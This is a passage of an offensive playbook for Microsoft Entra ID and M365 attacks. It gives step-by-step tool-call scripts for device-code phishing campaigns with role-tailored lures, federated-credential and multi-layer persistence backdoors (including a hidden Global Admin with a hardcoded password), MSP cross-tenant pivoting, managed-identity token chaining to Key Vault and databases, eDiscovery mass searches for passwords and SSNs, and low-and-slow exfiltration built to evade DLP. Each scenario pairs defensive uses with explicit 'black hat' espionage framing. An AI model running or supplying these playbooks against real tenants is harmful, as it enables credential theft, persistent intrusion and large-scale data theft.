**Gray hat use:** Cross-tenant phishing simulation for red team engagements. No prior access to target tenant required. Uses only legitimate Microsoft infrastructure (Teams + device code flow).
**Black hat use:** Zero-infrastructure phishing. No phishing domains. No email infrastructure. No hosting. The attacker's tenant sends a Teams message, the victim authenticates on microsoft.com. The external sender banner in Teams is often ignored. Cross-tenant Teams messages bypass all email security (Defender, Proofpoint, etc.).
**Key insight:** External Teams messaging is enabled by default in most tenants. The "[External]" banner in the Teams UI is small and frequently ignored. Combined with device code flow, this is a zero-infrastructure, zero-domain phishing attack that uses only legitimate Microsoft services.

---

### S76: Multi-Target Phishing Campaign -- Orchestrated Token Harvest
**Hat:** BLACK | **Perspective:** EXTERNAL | **OPSEC:** Medium
**MITRE:** T1566.002, T1598.003, T1528 | **Tools:** `recon_users`, `access_phishing`, `cred_device_code`, `evasion_set_ua`, `evasion_jitter`, `opsec_budget_set`, `cred_token_decode`, `report_evidence_package`

```
# Phase 1: Validate target list (from S04 LinkedIn OSINT pipeline)
recon_users(domain="m.grdz.org",
            usernames=["john.smith","jane.doe","bob.wilson","alice.chen",
                       "mike.taylor","sarah.johnson","david.brown","lisa.wang",
                       "tom.garcia","emily.miller","james.anderson","rachel.lee"],
            method="normal")

# Phase 2: Configure campaign OPSEC
opsec_budget_set(action="set", budget_type="phishing", limit=15)
evasion_set_ua(user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
evasion_jitter(min_seconds=120, max_seconds=600)

# Phase 3: Start device code flows for each target (batch)
cred_device_code(resource="graph", client_id="d3590ed6-52b3-4102-aeff-aad2292ab01c",
                 tenant="m.grdz.org", save_as="target_01")
cred_device_code(resource="graph", client_id="d3590ed6-52b3-4102-aeff-aad2292ab01c",
                 tenant="m.grdz.org", save_as="target_02")
cred_device_code(resource="graph", client_id="d3590ed6-52b3-4102-aeff-aad2292ab01c",
                 tenant="m.grdz.org", save_as="target_03")
# ... repeat for all validated targets

# Phase 4: Launch phishing emails with role-tailored pretexts
access_phishing(
    targets=["john.smith@m.grdz.org"],
    subject="Action Required: Q1 Financial Report Review",
    body="Please authenticate to access the Q1 financial review documents.",
    device_code_alias="target_01",
    save_as="campaign_finance")

access_phishing(
    targets=["jane.doe@m.grdz.org","bob.wilson@m.grdz.org"],
    subject="IT Security: Mandatory MFA Re-enrollment",
    body="Your MFA configuration requires re-verification due to a security policy update.",
    device_code_alias="target_02",
    save_as="campaign_it")

access_phishing(
    targets=["alice.chen@m.grdz.org","mike.taylor@m.grdz.org"],
    subject="HR: Updated Benefits Portal Access",
    body="Please sign in to review your updated benefits package for 2026.",
    device_code_alias="target_03",
    save_as="campaign_hr")

# Phase 5: Monitor and decode successful captures
cred_token_decode(token_alias="target_01")
cred_token_decode(token_alias="target_02")
cred_token_decode(token_alias="target_03")

# Phase 6: Package evidence for reporting
report_evidence_package(campaign_aliases=["campaign_finance","campaign_it","campaign_hr"],
                        include_tokens=False)
```

**White hat use:** Authorized phishing engagement measuring organization-wide resilience. Role-tailored pretexts test whether finance employees click financial lures, IT employees click IT lures, and HR employees click HR lures. Provides per-department click rates, auth rates, and response time metrics for the security awareness program.
**Gray hat use:** Red team phishing campaign with proper OPSEC budget management. The jitter between sends prevents burst detection. The evidence package provides a clean engagement report without exposing actual tokens.
**Black hat use:** Orchestrated multi-target campaign maximizes token capture rate by tailoring pretexts to each target's role (obtained via LinkedIn OSINT in S04). Role-tailored phishing has 3-5x higher success rates than generic campaigns. Each device code flow is independent -- one victim's report does not invalidate other codes.
**Key insight:** Batch device code generation followed by targeted delivery creates a "fishing net" effect. Each code has a 15-minute TTL. Staggering sends over 10 hours with jitter mimics normal business communication patterns and avoids triggering email security volume alerts.

---

## ADVANCED PERSISTENCE (S77-S79)

### S77: Federated Identity Credential Injection -- Workload Identity Takeover
**Hat:** BLACK | **Perspective:** PRIVILEGED | **OPSEC:** HIGH
**MITRE:** T1098.001, T1556 | **Tools:** `raw_invoke`, `cred_token`, `cred_token_decode`

```
# Phase 1: Enumerate existing app registrations and their federated credentials
raw_invoke(cmdlet="Get-AADIntApplications", token_alias="admin")

# Phase 2: Find a high-privilege app (e.g., one with Mail.ReadWrite.All)
raw_invoke(cmdlet="Get-AADIntApplicationPermissions", token_alias="admin",
           parameters={"ApplicationId": "<target_app_id>"})

# Phase 3: Add a federated identity credential pointing to attacker-controlled identity provider
raw_invoke(cmdlet="New-AADIntApplicationFederatedCredential", token_alias="admin",
           parameters={"ApplicationId": "<target_app_id>",
                        "Name": "github-actions-prod",
                        "Issuer": "https://token.actions.githubusercontent.com",
                        "Subject": "repo:attacker-org/attacker-repo:ref:refs/heads/main",
                        "Audiences": ["api://AzureADTokenExchange"]})

# Phase 4: From attacker's GitHub Actions, request a token using the federated credential
# (GitHub Actions generates a JWT, which Entra ID trusts as the federated IdP)
cred_token(resource="graph", method="federated",
           tenant="b9e2249e-1d7c-4977-8a88-6a70bc6bab6a",
           client_id="<target_app_id>",
           federated_token="<github_actions_jwt>",
           save_as="federated_access")

# Phase 5: Verify access
cred_token_decode(token_alias="federated_access")
```

**White hat use:** Audit federated identity credentials on all app registrations. Find apps that trust external identity providers (GitHub, GCP, AWS). Verify that the trusted subjects are scoped to specific repos/projects and not wildcarded. Check for orphaned federated credentials pointing to decommissioned CI/CD pipelines.
**Gray hat use:** Red team persistence via workload identity federation. Add a federated credential to an existing high-privilege app. The credential points to an attacker-controlled GitHub repo. Any GitHub Actions run in that repo can now authenticate as the app -- no secrets to rotate, no certificates to manage.
**Black hat use:** Federated identity credentials are the most durable persistence mechanism in Entra ID. They do not expire (no secret/certificate rotation). They do not appear in traditional credential audits. The authentication happens through a trusted external IdP (GitHub, AWS, GCP), making it look like legitimate CI/CD traffic. To remove, an admin must know the specific federated credential exists and delete it.
**Key insight:** Federated identity credentials are a blind spot in most security audits. They do not show up in the "Certificates & secrets" blade -- they are in a separate "Federated credentials" tab. Most security tools and scripts that audit app credentials only check secrets and certificates, missing federated credentials entirely.

---

### S78: Multi-Layer Persistence Stack -- Redundant Backdoor Deployment
**Hat:** BLACK | **Perspective:** PRIVILEGED | **OPSEC:** LOUD
**MITRE:** T1098.001, T1098.005, T1556.007, T1484.002, T1111 | **Tools:** `persist_federation`, `persist_mfa_app`, `persist_device`, `persist_pta_agent`, `raw_invoke`, `cred_token`, `cred_otp_new_secret`

```
# Phase 0: OPSEC assessment (this is loud -- plan accordingly)
opsec_check(tool_name="persist_federation")
opsec_check(tool_name="persist_pta_agent")
opsec_check(tool_name="persist_mfa_app")

# LAYER 1: Federation backdoor (survives everything except cert revocation)
persist_federation(token_alias="admin", domain="m.grdz.org", action="install")

# LAYER 2: Rogue MFA on 3 different admin accounts
persist_mfa_app(token_alias="admin", user="admin@m.grdz.org")
cred_otp_new_secret(user="admin@m.grdz.org")
persist_mfa_app(token_alias="admin", user="globaladmin@m.grdz.org")
cred_otp_new_secret(user="globaladmin@m.grdz.org")
persist_mfa_app(token_alias="admin", user="breakglass@m.grdz.org")
cred_otp_new_secret(user="breakglass@m.grdz.org")

# LAYER 3: Rogue device with PRT (bypasses device compliance CA)
cred_token(resource="aad_join", save_as="join")
persist_device(token_alias="join",
               device_name="GRDZ-WS-0847",
               os_version="10.0.22631.4602",
               join_type="aad")

# LAYER 4: Hidden service account with Global Admin
impact_user_ops(token_alias="admin", action="create",
                properties={"UserPrincipalName": "svc-monitoring@m.grdz.org",
                             "DisplayName": "Azure Monitor Service",
                             "Password": "S3cur3M0n!t0r2026"})
privesc_role_assign(token_alias="admin",
                    target_user="<svc_objectid>",
                    role="Global Administrator")

# LAYER 5: App registration with certificate (MFA-free access)
raw_invoke(cmdlet="New-AADIntApplication", token_alias="admin",
           parameters={"DisplayName": "Azure Security Scanner",
                        "RequiredResourceAccess": "Directory.ReadWrite.All,Mail.ReadWrite"})
raw_invoke(cmdlet="New-AADIntApplicationCertificate", token_alias="admin",
           parameters={"ApplicationId": "<new_app_id>"})

# Record all persistence mechanisms for later cleanup
report_generate(format="json", include_evidence=True)
```

**White hat use:** Demonstrate "defense in depth for attackers" -- show security leadership that a sophisticated attacker deploys multiple independent persistence mechanisms simultaneously. If IR finds and removes one (e.g., the federation backdoor), four others remain. This justifies comprehensive IR playbooks that check ALL persistence types, not just the most obvious one.
**Gray hat use:** Red team persistence exercise. Deploy multiple layers and test IR team's ability to find and eradicate all of them. Score the IR team on completeness -- did they find all 5 layers?
**Black hat use:** APT-grade persistence. Each layer is independent: (1) Federation = impersonate any user, (2) Rogue MFA = bypass MFA on 3 admin accounts, (3) Rogue device = bypass device compliance, (4) Hidden admin = password-based access, (5) App cert = automated API access. Removing one does not affect the others.
**Key insight:** Real APT actors deploy 3-7 independent persistence mechanisms. Most IR teams find the most obvious one (often the hidden admin account) and declare the incident resolved. A comprehensive IR must check: federation settings, MFA registrations on all admins, device registrations, app registrations, PTA agents, sync agents, and role assignments.

---

### S79: Access Package Self-Escalation -- Governance Abuse for Privilege Gain
**Hat:** GRAY | **Perspective:** INTERNAL | **OPSEC:** Medium
**MITRE:** T1078.004, T1098.003 | **Tools:** `raw_invoke`, `cred_token`, `cred_token_decode`

```
# Phase 1: Enumerate all access packages available to the current user
raw_invoke(cmdlet="Get-AADIntAccessPackages", token_alias="user")

# Phase 2: List access package catalogs (some may be self-service)
raw_invoke(cmdlet="Get-AADIntAccessPackageCatalogs", token_alias="user")

# Phase 3: Find packages that grant admin group membership or admin roles
raw_invoke(cmdlet="Get-AADIntAccessPackageResources", token_alias="user",
           parameters={"CatalogId": "<catalog_id>"})

# Phase 4: Check assignment policies -- are any auto-approved?
raw_invoke(cmdlet="Get-AADIntAccessPackageAssignmentPolicies", token_alias="user",
           parameters={"AccessPackageId": "<admin_package_id>"})

# Phase 5: Request access to the admin package
raw_invoke(cmdlet="New-AADIntAccessPackageAssignmentRequest", token_alias="user",
           parameters={"AccessPackageId": "<admin_package_id>",
                        "Justification": "Performing quarterly security audit per CISO request"})

# Phase 6: If auto-approved, verify escalated permissions
cred_token(resource="graph", method="interactive", save_as="escalated")
cred_token_decode(token_alias="escalated")

# Phase 7: Check if access review is configured (or if access is permanent)
raw_invoke(cmdlet="Get-AADIntAccessPackageAssignment", token_alias="escalated",
           parameters={"UserId": "<current_user_id>"})
```

**White hat use:** Audit Identity Governance configuration. Check for access packages that: (1) grant admin roles via self-service, (2) have auto-approval policies, (3) lack periodic access reviews, (4) have overly broad eligibility criteria ("All users" can request). Common finding: packages created for a project and never decommissioned.
**Gray hat use:** Red team privilege escalation via legitimate governance channels. Instead of exploiting a vulnerability, use the organization's own self-service access governance to request admin privileges. If the approval workflow is weak (auto-approve, single approver who rubber-stamps, no justification validation), the escalation succeeds through "legitimate" channels.
**Black hat use:** Abuse access packages to gain admin privileges without triggering traditional privilege escalation alerts. The request goes through the governance system, making it look legitimate. Auto-approved packages grant instant access. Even packages requiring approval can be social-engineered: "CISO-requested security audit" justifications are rarely questioned.
**Key insight:** Access packages are designed for self-service privilege requests. When misconfigured (auto-approval, no access reviews, broad eligibility), they become a legitimate privilege escalation path that does not trigger SIEM alerts because the system is working "as designed." This is governance misconfiguration, not a vulnerability.

---

## ADVANCED LATERAL MOVEMENT (S80-S82)

### S80: Cross-Tenant GDAP Cascade -- MSP Supply Chain Pivot
**Hat:** BLACK | **Perspective:** PARTNER | **OPSEC:** Medium
**MITRE:** T1199, T1078.004 | **Tools:** `cred_token`, `move_partner_pivot`, `recon_insider`, `recon_ca_policies`, `collect_email`, `analyze_attack_graph`

```
# Phase 1: Authenticate as compromised MSP partner admin
cred_token(resource="partner", save_as="msp_admin")

# Phase 2: Enumerate all GDAP relationships (customer tenants)
move_partner_pivot(token_alias="msp_admin", action="list")
# Returns: customer_1 (Acme Corp), customer_2 (Widgets Inc), customer_3 (FooCo), ...

# Phase 3: Map GDAP role assignments per customer
move_partner_pivot(token_alias="msp_admin", action="roles",
                   target_tenant="<customer_1_id>")
move_partner_pivot(token_alias="msp_admin", action="roles",
                   target_tenant="<customer_2_id>")
move_partner_pivot(token_alias="msp_admin", action="roles",
                   target_tenant="<customer_3_id>")

# Phase 4: Pivot to highest-privilege customer first
move_partner_pivot(token_alias="msp_admin", action="request",
                   target_tenant="<customer_1_id>")
cred_token(resource="graph", tenant="<customer_1_id>", save_as="customer_1")

# Phase 5: Recon the customer tenant
recon_insider(token_alias="customer_1", scope="full")
recon_ca_policies(token_alias="customer_1")

# Phase 6: Cascade to next customer
move_partner_pivot(token_alias="msp_admin", action="request",
                   target_tenant="<customer_2_id>")
cred_token(resource="graph", tenant="<customer_2_id>", save_as="customer_2")

# Phase 7: Access email across multiple customers
collect_email(token_alias="customer_1")
collect_email(token_alias="customer_2")

# Phase 8: Map full attack graph across all accessible tenants
analyze_attack_graph(token_alias="msp_admin", start_node="partner_relationships")
```

**White hat use:** MSP security audit. Validate GDAP role assignments across all customer tenants. Find customers where the MSP has excessive privileges (Global Admin instead of scoped roles). Ensure GDAP relationships have expiration dates and are regularly reviewed.
**Gray hat use:** Red team MSP pivot exercise. Demonstrate that compromising one MSP admin account provides access to every customer tenant. Measure the blast radius: how many customers, what roles, what data access.
**Black hat use:** SolarWinds/Kaseya supply chain playbook adapted for GDAP. Compromise one MSP admin and cascade across 50-500 customer tenants. Each customer tenant can be fully enumerated, their email read, their data exfiltrated. GDAP relationships are designed for this exact access pattern -- the attacker is using the system as intended, just with stolen credentials.
**Key insight:** GDAP is Microsoft's replacement for DAP (Delegated Admin Privileges). While more secure than DAP (scoped roles instead of Global Admin), most MSPs still over-provision GDAP roles. A single compromised MSP Global Admin with GDAP relationships to 100 customers = 100 simultaneous tenant compromises. This is the highest-impact single-account compromise in the Microsoft ecosystem.

---

### S81: Cloud Shell to On-Prem Bridge -- Cloud-to-Internal Network Pivot
**Hat:** GRAY | **Perspective:** INTERNAL | **OPSEC:** Medium
**MITRE:** T1021.007, T1059.009, T1530 | **Tools:** `cred_token`, `raw_invoke`, `azure_enum`, `move_vm_exec`

```
# Phase 1: Get Cloud Shell access
cred_token(resource="cloud_shell", save_as="cloudshell")

# Phase 2: Start Cloud Shell session
raw_invoke(cmdlet="Start-AADIntCloudShell", token_alias="cloudshell")

# Phase 3: Enumerate Cloud Shell storage for sensitive files
# Cloud Shell storage contains user's persistent files: scripts, SSH keys, history
raw_invoke(cmdlet="Get-AADIntCloudShellFiles", token_alias="cloudshell")

# Phase 4: Extract SSH keys and bash history from Cloud Shell storage
raw_invoke(cmdlet="Get-AADIntCloudShellFile", token_alias="cloudshell",
           parameters={"Path": ".ssh/id_rsa"})
raw_invoke(cmdlet="Get-AADIntCloudShellFile", token_alias="cloudshell",
           parameters={"Path": ".bash_history"})
raw_invoke(cmdlet="Get-AADIntCloudShellFile", token_alias="cloudshell",
           parameters={"Path": ".azure/accessTokens.json"})

# Phase 5: Enumerate Azure VMs with vnet connectivity (on-prem bridge candidates)
azure_enum(token_alias="cloudshell", scope="vms")
azure_enum(token_alias="cloudshell", scope="vnets")

# Phase 6: Find VMs connected to on-prem via VPN Gateway or ExpressRoute
raw_invoke(cmdlet="Get-AADIntAzureVNetGateways", token_alias="cloudshell")

# Phase 7: Run commands on a VM with hybrid connectivity
move_vm_exec(token_alias="cloudshell",
             vm_name="HYBRID-DC-01",
             resource_group="infrastructure",
             subscription="<id>",
             script_content="ipconfig /all & route print & nltest /dsgetdc:m.grdz.org & net view \\\\fileserver.m.grdz.local")

# Phase 8: Use the VM as a pivot to reach on-prem resources
move_vm_exec(token_alias="cloudshell",
             vm_name="HYBRID-DC-01",
             resource_group="infrastructure",
             subscription="<id>",
             script_content="powershell -c \"Invoke-WebRequest -Uri http://intranet.m.grdz.local/admin -UseDefaultCredentials\"")
```

**White hat use:** Cloud-to-on-prem pivot demonstration. Show security leadership that Cloud Shell and Azure VMs with VPN/ExpressRoute connectivity create a bridge from cloud compromise to internal network access. Validate that: (1) Cloud Shell is restricted by CA, (2) VM RunCommand is logged and alerted, (3) VPN Gateway access is monitored.
**Gray hat use:** Red team hybrid infrastructure attack. Cloud Shell often bypasses VPN requirements (it is a cloud service, not a remote access tool). The backing storage account may contain SSH keys for on-prem servers, terraform state with secrets, and bash history revealing internal hostnames and credentials.
**Black hat use:** Bridge from cloud identity compromise to internal network access in three steps: (1) Access Cloud Shell (cloud-native, CA often does not cover it), (2) extract SSH keys and connection strings from Cloud Shell storage, (3) use Azure VM RunCommand on VPN-connected VMs to reach internal network. No VPN client needed. No direct network access required.
**Key insight:** Cloud Shell is a fully functional Linux terminal with the user's Azure permissions, az CLI pre-installed, and a persistent storage account. The storage account is an Azure Files share that often contains years of accumulated scripts, credentials, and SSH keys. This is one of the most overlooked data exfiltration sources in Azure assessments.

---

### S82: Managed Identity Chain -- VM to Key Vault to Database Credential Cascade
**Hat:** GRAY | **Perspective:** INTERNAL | **OPSEC:** Low
**MITRE:** T1552.005, T1552.001, T1078.004 | **Tools:** `cred_imds_token`, `cred_token_decode`, `raw_invoke`, `azure_enum`

```
# Phase 1: From compromised Azure VM, get managed identity token for Azure Management
cred_imds_token(resource="https://management.azure.com", save_as="mi_mgmt")

# Phase 2: Decode token to see managed identity permissions
cred_token_decode(token_alias="mi_mgmt")

# Phase 3: Enumerate accessible resources using the managed identity
azure_enum(token_alias="mi_mgmt", scope="all")

# Phase 4: Get managed identity token for Key Vault
cred_imds_token(resource="https://vault.azure.net", save_as="mi_keyvault")

# Phase 5: List and extract Key Vault secrets
raw_invoke(cmdlet="Get-AADIntKeyVaultSecrets", token_alias="mi_keyvault",
           parameters={"VaultName": "grdz-prod-kv"})

raw_invoke(cmdlet="Get-AADIntKeyVaultSecret", token_alias="mi_keyvault",
           parameters={"VaultName": "grdz-prod-kv",
                        "SecretName": "sql-admin-password"})

raw_invoke(cmdlet="Get-AADIntKeyVaultSecret", token_alias="mi_keyvault",
           parameters={"VaultName": "grdz-prod-kv",
                        "SecretName": "storage-connection-string"})

# Phase 6: Get managed identity token for SQL Database
cred_imds_token(resource="https://database.windows.net", save_as="mi_sql")

# Phase 7: Use the SQL token to access production database
raw_invoke(cmdlet="Invoke-AADIntSQLQuery", token_alias="mi_sql",
           parameters={"Server": "grdz-prod-sql.database.windows.net",
                        "Database": "customers",
                        "Query": "SELECT TOP 10 * FROM Users"})

# Phase 8: Get managed identity token for Storage Account
cred_imds_token(resource="https://storage.azure.com", save_as="mi_storage")

# Phase 9: Access storage blobs
raw_invoke(cmdlet="Get-AADIntStorageBlobs", token_alias="mi_storage",
           parameters={"AccountName": "grdzprodstorage",
                        "ContainerName": "backups"})
```

**White hat use:** Audit managed identity permissions. Many VMs are given managed identities with broad permissions (Contributor, Key Vault read, SQL admin) for convenience during development. Show that compromising one VM leads to: Key Vault secrets, production databases, storage accounts, and potentially the entire Azure subscription. Recommend least-privilege managed identity scoping.
**Gray hat use:** Red team Azure lateral movement demonstration. Start from a single VM compromise (via S42 RunCommand) and cascade through managed identity to access Key Vault, SQL, and Storage -- all without any credentials, using only IMDS tokens.
**Black hat use:** The IMDS credential chain is silent and requires zero credentials. Any process running on the VM can call http://169.254.169.254/metadata/identity/oauth2/token to get tokens for any resource the managed identity has access to. There is no authentication, no MFA, and no interactive sign-in log. The tokens appear in the "Managed Identity" sign-in logs which most SOCs do not monitor.
**Key insight:** Managed identities are the most over-permissioned identity type in Azure. They are created for convenience (no secret management) but rarely scoped to least privilege. The chain VM -> Key Vault -> SQL is the most common Azure lateral movement path in real breaches. IMDS is accessible from any process on the VM -- no admin rights needed.

---

## ADVANCED COLLECTION (S83-S85)

### S83: Compliance Portal Mass Search -- Cross-Tenant eDiscovery
**Hat:** BLACK | **Perspective:** PRIVILEGED | **OPSEC:** HIGH
**MITRE:** T1530, T1114.002 | **Tools:** `cred_token`, `raw_invoke`, `collect_email`, `collect_sharepoint`

```
# Phase 1: Obtain compliance portal access
cred_token(resource="compliance", save_as="compliance")
raw_invoke(cmdlet="Get-AADIntComplianceAPICookies", token_alias="compliance")

# Phase 2: Create an eDiscovery search across all mailboxes
raw_invoke(cmdlet="New-AADIntComplianceSearch", token_alias="compliance",
           parameters={"Name": "Security-Audit-Q1-2026",
                        "ContentMatchQuery": "password OR credentials OR secret OR API key OR SSN",
                        "ExchangeLocation": "All",
                        "SharePointLocation": "All"})

# Phase 3: Start the search
raw_invoke(cmdlet="Start-AADIntComplianceSearch", token_alias="compliance",
           parameters={"SearchName": "Security-Audit-Q1-2026"})

# Phase 4: Check search status
raw_invoke(cmdlet="Get-AADIntComplianceSearchStatus", token_alias="compliance",
           parameters={"SearchName": "Security-Audit-Q1-2026"})

# Phase 5: Create a targeted PII search
raw_invoke(cmdlet="New-AADIntComplianceSearch", token_alias="compliance",
           parameters={"Name": "PII-Exposure-Audit",
                        "ContentMatchQuery": "(social security OR SSN OR date of birth OR bank account) AND (employee OR customer)",
                        "ExchangeLocation": "All",
                        "SharePointLocation": "All"})
raw_invoke(cmdlet="Start-AADIntComplianceSearch", token_alias="compliance",
           parameters={"SearchName": "PII-Exposure-Audit"})

# Phase 6: Export search results
raw_invoke(cmdlet="Export-AADIntComplianceSearchResults", token_alias="compliance",
           parameters={"SearchName": "Security-Audit-Q1-2026"})

# Phase 7: Download exported results
raw_invoke(cmdlet="Get-AADIntComplianceSearchExport", token_alias="compliance",
           parameters={"SearchName": "Security-Audit-Q1-2026"})

# Phase 8: Search unified audit log for evidence of search activity (counterintel)
raw_invoke(cmdlet="Search-AADIntUnifiedAuditLog", token_alias="compliance",
           parameters={"StartDate": "2026-03-20",
                        "EndDate": "2026-03-26",
                        "Operations": "SearchCreated,SearchStarted,SearchExported"})
```

**White hat use:** Audit eDiscovery permissions and controls. Verify that: (1) eDiscovery Manager role is restricted to legal/compliance, (2) compliance search activity is logged and alerted, (3) search scope can be limited (not "All" locations), (4) export requires additional approval. DLP and data classification assessment.
**Gray hat use:** Red team data mining exercise. Demonstrate that one account with eDiscovery Manager role can search every mailbox and SharePoint site in the organization simultaneously. No per-user permissions needed. Bypasses all document-level sharing restrictions.
**Black hat use:** The most powerful data collection tool in M365. Compliance search bypasses all user-level permissions -- it searches content across the entire tenant regardless of sharing settings, folder permissions, or mailbox delegation. One search for "password" across all mailboxes returns every password ever shared via email. PII search returns every document with customer data.
**Key insight:** eDiscovery is the ultimate insider threat tool. It is designed for legal holds and investigations but in attacker hands it is a cross-tenant data vacuum. The search runs server-side (no data transfer during search), only the export creates data movement. Most orgs have 5-15 users with eDiscovery Manager role, many of whom do not need it.

---

### S84: Selective Exfiltration with DLP Evasion -- Under-Threshold Data Theft
**Hat:** BLACK | **Perspective:** INTERNAL | **OPSEC:** Low
**MITRE:** T1030, T1567, T1048 | **Tools:** `cred_token`, `collect_onedrive`, `collect_sharepoint`, `collect_email`, `evasion_jitter`, `opsec_budget_set`

```
# Phase 1: Configure low-and-slow exfiltration parameters
opsec_budget_set(action="set", budget_type="download", limit=50)
evasion_jitter(min_seconds=300, max_seconds=1800)

# Phase 2: Get tokens for each data source
cred_token(resource="onedrive", save_as="exfil_od")
cred_token(resource="graph", save_as="exfil_graph")

# Phase 3: Selective OneDrive exfiltration (target high-value files only)
# List files first, then download only specific high-value targets
collect_onedrive(token_alias="exfil_od", action="list")

# Download 1-2 files per session, max 5 per day
collect_onedrive(token_alias="exfil_od", action="download",
                 file_path="/Documents/2026_Strategic_Plan.docx")

# Wait (jitter handles delay)
collect_onedrive(token_alias="exfil_od", action="download",
                 file_path="/Documents/M_and_A_Target_List.xlsx")

# Phase 4: SharePoint selective access (single sensitive file per site)
collect_sharepoint(token_alias="exfil_graph",
                   site_url="https://mgrdz.sharepoint.com/sites/finance",
                   action="download",
                   file_path="/Shared Documents/Budget_2026_Final.xlsx")

# Phase 5: Email exfiltration (search for keywords, download matching only)
collect_email(token_alias="exfil_graph",
              search="subject:confidential OR subject:acquisition OR subject:salary",
              max_results=10)

# Phase 6: Check OPSEC budget
opsec_budget_check()
opsec_budget_report()

# Phase 7: Repeat over multiple days at different times
# Day 2 targets:
collect_onedrive(token_alias="exfil_od", action="download",
                 file_path="/Documents/Customer_Database_Export.csv")
collect_sharepoint(token_alias="exfil_graph",
                   site_url="https://mgrdz.sharepoint.com/sites/hr",
                   action="download",
                   file_path="/Shared Documents/Employee_Compensation_2026.xlsx")
```

**White hat use:** Test DLP policy thresholds. Most DLP policies trigger on bulk downloads (100+ files, 1GB+ in an hour). This tests whether the DLP can detect low-volume, high-value exfiltration -- 2-3 files per day, targeted by keyword, staying under volume thresholds.
**Gray hat use:** Red team DLP bypass exercise. Demonstrate that selective exfiltration of the 10 most valuable files in the organization goes undetected by DLP policies designed for bulk download detection. Provide specific recommendations for content-based (not volume-based) DLP rules.
**Black hat use:** Industrial espionage playbook. Target only the highest-value files: strategic plans, M&A targets, salary databases, customer lists, trade secrets. 2-3 files per day over 2 weeks = 30 high-value documents without triggering any DLP alert. The jitter between downloads mimics normal work patterns.
**Key insight:** DLP policies are typically volume-based: "alert on 100+ file downloads in 1 hour." An attacker who downloads 2 strategic documents per day for a month exfiltrates the 60 most valuable files in the organization without triggering a single alert. Content-based DLP (classify documents by sensitivity, alert on any download of "Top Secret" content) is the only defense, but most orgs only have volume-based rules.

---

### S85: Teams Channel Infiltration -- Private Channel Harvest
**Hat:** GRAY | **Perspective:** INTERNAL | **OPSEC:** Medium
**MITRE:** T1530, T1213 | **Tools:** `cred_token`, `collect_teams`, `raw_invoke`, `collect_sharepoint`

```
# Phase 1: Get Teams token
cred_token(resource="teams", save_as="teams_infiltrate")

# Phase 2: Enumerate all Teams the user belongs to
collect_teams(token_alias="teams_infiltrate", action="teams")

# Phase 3: Enumerate all channels including private channels
collect_teams(token_alias="teams_infiltrate", action="channels")

# Phase 4: Attempt to join private channels (if org policy allows self-add)
raw_invoke(cmdlet="Add-AADIntTeamsChannelMember", token_alias="teams_infiltrate",
           parameters={"TeamId": "<executive_team_id>",
                        "ChannelId": "<strategy_channel_id>",
                        "UserId": "<current_user_id>"})

# Phase 5: Harvest messages from accessible channels
collect_teams(token_alias="teams_infiltrate", action="messages",
              team_id="<executive_team_id>",
              channel_id="<strategy_channel_id>")

# Phase 6: Harvest files shared in Teams channels
# (Teams files are stored in SharePoint -- each channel has a folder)
collect_teams(token_alias="teams_infiltrate", action="files",
              team_id="<executive_team_id>",
              channel_id="<strategy_channel_id>")

# Phase 7: Access the underlying SharePoint site for more files
collect_sharepoint(token_alias="teams_infiltrate",
                   site_url="https://mgrdz.sharepoint.com/sites/ExecutiveLeadership",
                   action="download",
                   file_path="/General/Board_Deck_Q1_2026.pptx")

# Phase 8: Harvest meeting recordings (stored in OneDrive/SharePoint)
raw_invoke(cmdlet="Get-AADIntTeamsMeetingRecordings", token_alias="teams_infiltrate",
           parameters={"TeamId": "<executive_team_id>"})

# Phase 9: Download specific recording
raw_invoke(cmdlet="Get-AADIntTeamsMeetingRecording", token_alias="teams_infiltrate",
           parameters={"RecordingUrl": "<recording_url>"})
```

**White hat use:** Audit Teams channel access controls. Test: (1) Can users self-add to private channels they were not invited to? (2) Are meeting recordings protected? (3) Can non-members enumerate private channel names? (4) Are file sharing permissions properly scoped? Many orgs assume "private channel" = secure, but the underlying SharePoint permissions may be broader.
**Gray hat use:** Red team data collection via Teams. Messages in Teams channels often contain unstructured sensitive data: credentials shared "temporarily," decision-making discussions, M&A strategy, HR deliberations, incident response chats with IOCs and vulnerabilities. Meeting recordings contain unfiltered discussions that would never be written in email.
**Black hat use:** Teams channels are the most unmonitored data source in M365. Meeting recordings contain verbal discussions of strategy, financials, and personnel decisions. Private channel file shares often contain drafts of announcements, board materials, and legal documents that have not been formally shared. Unlike email, Teams messages are rarely covered by DLP policies.
**Key insight:** Teams meeting recordings are stored in OneDrive (for ad-hoc meetings) or SharePoint (for channel meetings). Recording access often defaults to the meeting organizer and attendees, but SharePoint inheritance can expose them more broadly. A single recording of a board meeting can contain more sensitive information than months of email.

---

## FULL KILL CHAINS (S86-S87)

### S86: Zero-to-Admin in One Session -- Speed Run to Global Admin
**Hat:** BLACK | **Perspective:** EXTERNAL | **OPSEC:** LOUD
**MITRE:** T1589.001, T1589.002, T1590.001, T1566.002, T1528, T1087.004, T1518.001, T1069.003, T1548, T1098.003 | **Tools:** `recon_tenant`, `recon_users`, `recon_domains`, `cred_device_code`, `cred_token`, `cred_token_decode`, `recon_insider`, `recon_ca_policies`, `analyze_ca`, `analyze_privesc`, `analyze_attack_graph`, `privesc_role_assign`, `report_generate`, `report_mitre_layer`, `report_narrative`

```
# ===== PHASE 1: RECONNAISSANCE (5 minutes) =====

# Step 1: Tenant fingerprint
recon_tenant(domain="m.grdz.org")

# Step 2: Domain enumeration
recon_domains(domain="m.grdz.org")

# Step 3: User enumeration -- target C-suite and IT
recon_users(domain="m.grdz.org",
            usernames=["admin","it.admin","helpdesk","ceo","cfo","cto",
                       "ciso","security","soc","globaladmin","breakglass",
                       "john.smith","jane.doe","bob.wilson"],
            method="normal")

# ===== PHASE 2: INITIAL ACCESS (15 minutes) =====

# Step 4: Device code phishing targeting IT helpdesk (high success, low privilege start)
cred_device_code(resource="graph",
                 client_id="d3590ed6-52b3-4102-aeff-aad2292ab01c",
                 tenant="m.grdz.org",
                 save_as="phished_helpdesk")
# (Send phishing email/Teams message to helpdesk with device code)

# Step 5: Decode captured token
cred_token_decode(token_alias="phished_helpdesk")

# ===== PHASE 3: ENUMERATION (10 minutes) =====

# Step 6: Full tenant enumeration with phished account
cred_token(resource="aad_graph", method="refresh_token", save_as="enum")
recon_insider(token_alias="enum", scope="full")

# Step 7: CA policy analysis
recon_ca_policies(token_alias="enum")
analyze_ca(token_alias="enum", analysis_type="gaps")

# Step 8: Service principal audit -- find over-permissioned apps
